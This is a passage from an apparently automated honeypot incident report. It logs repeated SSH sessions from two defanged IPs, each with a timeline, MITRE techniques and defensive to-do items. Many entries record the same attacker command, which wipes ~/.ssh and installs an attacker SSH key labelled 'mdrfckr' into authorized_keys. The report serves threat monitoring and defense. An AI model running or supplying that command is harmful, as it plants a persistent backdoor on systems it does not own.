- [ ] Submit `141.109.168[.]149` to AbuseIPDB if not already reported
- [ ] Block `141.109.168[.]149` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44686c8dc55d

| Field | Detail |
|---|---|
| **Source IP** | `141.109.168[.]149` |
| **First Seen** | 2026-06-06 10:25 |
| **Last Seen** | 2026-06-06 10:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 10:25:56` | `cowrie.session.connect` |
| `2026-06-06 10:25:56` | `cowrie.client.version` |
| `2026-06-06 10:25:56` | `cowrie.client.kex` |
| `2026-06-06 10:25:57` | `cowrie.login.success` |
| `2026-06-06 10:25:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `141.109.168[.]149` to AbuseIPDB if not already reported
- [ ] Block `141.109.168[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1244f6167858

| Field | Detail |
|---|---|
| **Source IP** | `101.100.194[.]181` |
| **First Seen** | 2026-06-06 10:28 |
| **Last Seen** | 2026-06-06 10:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 10:28:45` | `cowrie.session.connect` |
| `2026-06-06 10:28:45` | `cowrie.client.version` |
| `2026-06-06 10:28:45` | `cowrie.client.kex` |
| `2026-06-06 10:28:45` | `cowrie.login.success` |
| `2026-06-06 10:28:45` | `cowrie.session.params` |
| `2026-06-06 10:28:45` | `cowrie.command.input` |
| `2026-06-06 10:28:45` | `cowrie.command.failed` |
| `2026-06-06 10:28:46` | `cowrie.log.closed` |
| `2026-06-06 10:28:46` | `cowrie.session.params` |
| `2026-06-06 10:28:46` | `cowrie.command.input` |
| `2026-06-06 10:28:46` | `cowrie.session.file_download` |
| `2026-06-06 10:28:46` | `cowrie.log.closed` |
| `2026-06-06 10:28:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.100.194[.]181` to AbuseIPDB if not already reported
- [ ] Block `101.100.194[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0aecf5b4c093

| Field | Detail |
|---|---|
| **Source IP** | `101.100.194[.]181` |
| **First Seen** | 2026-06-06 10:28 |
| **Last Seen** | 2026-06-06 10:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 10:28:47` | `cowrie.session.connect` |
| `2026-06-06 10:28:47` | `cowrie.client.version` |
| `2026-06-06 10:28:47` | `cowrie.client.kex` |
| `2026-06-06 10:28:48` | `cowrie.login.success` |
| `2026-06-06 10:28:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.100.194[.]181` to AbuseIPDB if not already reported
- [ ] Block `101.100.194[.]181` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18e4d90ed808

| Field | Detail |
|---|---|
| **Source IP** | `101.100.194[.]181` |
| **First Seen** | 2026-06-06 10:30 |
| **Last Seen** | 2026-06-06 10:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 10:30:27` | `cowrie.session.connect` |
| `2026-06-06 10:30:27` | `cowrie.client.version` |
| `2026-06-06 10:30:27` | `cowrie.client.kex` |
| `2026-06-06 10:30:27` | `cowrie.login.success` |
| `2026-06-06 10:30:27` | `cowrie.session.params` |
| `2026-06-06 10:30:27` | `cowrie.command.input` |
| `2026-06-06 10:30:27` | `cowrie.command.failed` |
| `2026-06-06 10:30:27` | `cowrie.log.closed` |
| `2026-06-06 10:30:28` | `cowrie.session.params` |
| `2026-06-06 10:30:28` | `cowrie.command.input` |
| `2026-06-06 10:30:28` | `cowrie.session.file_download` |
| `2026-06-06 10:30:28` | `cowrie.log.closed` |
| `2026-06-06 10:30:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.100.194[.]181` to AbuseIPDB if not already reported
- [ ] Block `101.100.194[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4840e2434ac7

| Field | Detail |
|---|---|
| **Source IP** | `101.100.194[.]181` |
| **First Seen** | 2026-06-06 10:30 |
| **Last Seen** | 2026-06-06 10:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 10:30:29` | `cowrie.session.connect` |
| `2026-06-06 10:30:29` | `cowrie.client.version` |
| `2026-06-06 10:30:29` | `cowrie.client.kex` |
| `2026-06-06 10:30:29` | `cowrie.login.success` |
| `2026-06-06 10:30:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.100.194[.]181` to AbuseIPDB if not already reported
- [ ] Block `101.100.194[.]181` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-727461cfa593

| Field | Detail |
|---|---|
| **Source IP** | `101.100.194[.]181` |
| **First Seen** | 2026-06-06 10:32 |
| **Last Seen** | 2026-06-06 10:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 10:32:08` | `cowrie.session.connect` |
| `2026-06-06 10:32:08` | `cowrie.client.version` |
| `2026-06-06 10:32:08` | `cowrie.client.kex` |
| `2026-06-06 10:32:08` | `cowrie.login.success` |
| `2026-06-06 10:32:09` | `cowrie.session.params` |
| `2026-06-06 10:32:09` | `cowrie.command.input` |
| `2026-06-06 10:32:09` | `cowrie.command.failed` |
| `2026-06-06 10:32:09` | `cowrie.log.closed` |
| `2026-06-06 10:32:09` | `cowrie.session.params` |
| `2026-06-06 10:32:09` | `cowrie.command.input` |
| `2026-06-06 10:32:09` | `cowrie.session.file_download` |
| `2026-06-06 10:32:09` | `cowrie.log.closed` |
| `2026-06-06 10:32:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.100.194[.]181` to AbuseIPDB if not already reported
- [ ] Block `101.100.194[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce3c70587303

| Field | Detail |
|---|---|
| **Source IP** | `101.100.194[.]181` |
| **First Seen** | 2026-06-06 10:32 |
| **Last Seen** | 2026-06-06 10:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 10:32:10` | `cowrie.session.connect` |
| `2026-06-06 10:32:10` | `cowrie.client.version` |
| `2026-06-06 10:32:10` | `cowrie.client.kex` |
| `2026-06-06 10:32:11` | `cowrie.login.success` |
| `2026-06-06 10:32:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.100.194[.]181` to AbuseIPDB if not already reported
- [ ] Block `101.100.194[.]181` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a04323387622

| Field | Detail |
|---|---|
| **Source IP** | `101.100.194[.]181` |
| **First Seen** | 2026-06-06 10:35 |
| **Last Seen** | 2026-06-06 10:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 10:35:39` | `cowrie.session.connect` |
| `2026-06-06 10:35:39` | `cowrie.client.version` |
| `2026-06-06 10:35:39` | `cowrie.client.kex` |
| `2026-06-06 10:35:39` | `cowrie.login.success` |
| `2026-06-06 10:35:39` | `cowrie.session.params` |
| `2026-06-06 10:35:39` | `cowrie.command.input` |
| `2026-06-06 10:35:39` | `cowrie.command.failed` |
| `2026-06-06 10:35:40` | `cowrie.log.closed` |
| `2026-06-06 10:35:40` | `cowrie.session.params` |
| `2026-06-06 10:35:40` | `cowrie.command.input` |
| `2026-06-06 10:35:40` | `cowrie.session.file_download` |
| `2026-06-06 10:35:40` | `cowrie.log.closed` |
| `2026-06-06 10:35:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.100.194[.]181` to AbuseIPDB if not already reported
- [ ] Block `101.100.194[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3faa5d2f5d90

| Field | Detail |
|---|---|
| **Source IP** | `101.100.194[.]181` |
| **First Seen** | 2026-06-06 10:35 |
| **Last Seen** | 2026-06-06 10:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 10:35:41` | `cowrie.session.connect` |
| `2026-06-06 10:35:41` | `cowrie.client.version` |
| `2026-06-06 10:35:41` | `cowrie.client.kex` |
| `2026-06-06 10:35:42` | `cowrie.login.success` |
| `2026-06-06 10:35:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.100.194[.]181` to AbuseIPDB if not already reported
- [ ] Block `101.100.194[.]181` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a64415c1eb7

| Field | Detail |
|---|---|
| **Source IP** | `141.109.168[.]149` |
| **First Seen** | 2026-06-06 10:36 |
| **Last Seen** | 2026-06-06 10:36 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 10:36:31` | `cowrie.session.connect` |
| `2026-06-06 10:36:31` | `cowrie.client.version` |
| `2026-06-06 10:36:31` | `cowrie.client.kex` |
| `2026-06-06 10:36:32` | `cowrie.login.success` |
| `2026-06-06 10:36:32` | `cowrie.session.params` |
| `2026-06-06 10:36:32` | `cowrie.command.input` |
| `2026-06-06 10:36:32` | `cowrie.command.failed` |
| `2026-06-06 10:36:32` | `cowrie.log.closed` |
| `2026-06-06 10:36:32` | `cowrie.session.params` |
| `2026-06-06 10:36:32` | `cowrie.command.input` |
| `2026-06-06 10:36:33` | `cowrie.session.file_download` |
| `2026-06-06 10:36:33` | `cowrie.log.closed` |
| `2026-06-06 10:36:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `141.109.168[.]149` to AbuseIPDB if not already reported
- [ ] Block `141.109.168[.]149` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c1ffe83877f

| Field | Detail |
|---|---|
| **Source IP** | `141.109.168[.]149` |
| **First Seen** | 2026-06-06 10:36 |
| **Last Seen** | 2026-06-06 10:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 10:36:35` | `cowrie.session.connect` |
| `2026-06-06 10:36:35` | `cowrie.client.version` |
| `2026-06-06 10:36:35` | `cowrie.client.kex` |
| `2026-06-06 10:36:36` | `cowrie.login.success` |
| `2026-06-06 10:36:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `141.109.168[.]149` to AbuseIPDB if not already reported
- [ ] Block `141.109.168[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be7b8369ac75

| Field | Detail |
|---|---|
| **Source IP** | `101.100.194[.]181` |
| **First Seen** | 2026-06-06 10:40 |
| **Last Seen** | 2026-06-06 10:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 10:40:40` | `cowrie.session.connect` |
| `2026-06-06 10:40:40` | `cowrie.client.version` |
| `2026-06-06 10:40:40` | `cowrie.client.kex` |
| `2026-06-06 10:40:40` | `cowrie.login.success` |
| `2026-06-06 10:40:40` | `cowrie.session.params` |
| `2026-06-06 10:40:40` | `cowrie.command.input` |
| `2026-06-06 10:40:40` | `cowrie.command.failed` |
| `2026-06-06 10:40:40` | `cowrie.log.closed` |
| `2026-06-06 10:40:40` | `cowrie.session.params` |
| `2026-06-06 10:40:40` | `cowrie.command.input` |
| `2026-06-06 10:40:40` | `cowrie.session.file_download` |
| `2026-06-06 10:40:40` | `cowrie.log.closed` |
| `2026-06-06 10:40:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.100.194[.]181` to AbuseIPDB if not already reported
- [ ] Block `101.100.194[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0781ad52b63

| Field | Detail |
|---|---|
| **Source IP** | `101.100.194[.]181` |
| **First Seen** | 2026-06-06 10:40 |
| **Last Seen** | 2026-06-06 10:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 10:40:42` | `cowrie.session.connect` |
| `2026-06-06 10:40:42` | `cowrie.client.version` |
| `2026-06-06 10:40:42` | `cowrie.client.kex` |
| `2026-06-06 10:40:42` | `cowrie.login.success` |
| `2026-06-06 10:40:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.100.194[.]181` to AbuseIPDB if not already reported
- [ ] Block `101.100.194[.]181` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1a4372ac34b

| Field | Detail |
|---|---|
| **Source IP** | `141.109.168[.]149` |
| **First Seen** | 2026-06-06 10:41 |
| **Last Seen** | 2026-06-06 10:41 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 10:41:53` | `cowrie.session.connect` |
| `2026-06-06 10:41:53` | `cowrie.client.version` |
| `2026-06-06 10:41:54` | `cowrie.client.kex` |
| `2026-06-06 10:41:54` | `cowrie.login.success` |
| `2026-06-06 10:41:55` | `cowrie.session.params` |
| `2026-06-06 10:41:55` | `cowrie.command.input` |
| `2026-06-06 10:41:55` | `cowrie.command.failed` |
| `2026-06-06 10:41:55` | `cowrie.log.closed` |
| `2026-06-06 10:41:55` | `cowrie.session.params` |
| `2026-06-06 10:41:55` | `cowrie.command.input` |
| `2026-06-06 10:41:55` | `cowrie.session.file_download` |
| `2026-06-06 10:41:55` | `cowrie.log.closed` |
| `2026-06-06 10:41:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `141.109.168[.]149` to AbuseIPDB if not already reported
- [ ] Block `141.109.168[.]149` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfb1eeebe94c

| Field | Detail |
|---|---|
| **Source IP** | `141.109.168[.]149` |
| **First Seen** | 2026-06-06 10:41 |
| **Last Seen** | 2026-06-06 10:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 10:41:58` | `cowrie.session.connect` |
| `2026-06-06 10:41:58` | `cowrie.client.version` |
| `2026-06-06 10:41:58` | `cowrie.client.kex` |
| `2026-06-06 10:41:59` | `cowrie.login.success` |
| `2026-06-06 10:41:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `141.109.168[.]149` to AbuseIPDB if not already reported
- [ ] Block `141.109.168[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12a29a4b6277

| Field | Detail |
|---|---|
| **Source IP** | `101.100.194[.]181` |
| **First Seen** | 2026-06-06 10:47 |
| **Last Seen** | 2026-06-06 10:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 10:47:16` | `cowrie.session.connect` |
| `2026-06-06 10:47:16` | `cowrie.client.version` |
| `2026-06-06 10:47:16` | `cowrie.client.kex` |
| `2026-06-06 10:47:16` | `cowrie.login.success` |
| `2026-06-06 10:47:16` | `cowrie.session.params` |
| `2026-06-06 10:47:16` | `cowrie.command.input` |
| `2026-06-06 10:47:16` | `cowrie.command.failed` |
| `2026-06-06 10:47:16` | `cowrie.log.closed` |
| `2026-06-06 10:47:17` | `cowrie.session.params` |
| `2026-06-06 10:47:17` | `cowrie.command.input` |
| `2026-06-06 10:47:17` | `cowrie.session.file_download` |
| `2026-06-06 10:47:17` | `cowrie.log.closed` |
| `2026-06-06 10:47:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.100.194[.]181` to AbuseIPDB if not already reported
- [ ] Block `101.100.194[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4c639ded58a

| Field | Detail |
|---|---|
| **Source IP** | `101.100.194[.]181` |
| **First Seen** | 2026-06-06 10:47 |
| **Last Seen** | 2026-06-06 10:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 10:47:18` | `cowrie.session.connect` |
| `2026-06-06 10:47:18` | `cowrie.client.version` |
| `2026-06-06 10:47:18` | `cowrie.client.kex` |
| `2026-06-06 10:47:18` | `cowrie.login.success` |
| `2026-06-06 10:47:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.100.194[.]181` to AbuseIPDB if not already reported
- [ ] Block `101.100.194[.]181` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84a7fefe89c3

| Field | Detail |
|---|---|
| **Source IP** | `101.100.194[.]181` |
| **First Seen** | 2026-06-06 10:52 |
| **Last Seen** | 2026-06-06 10:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
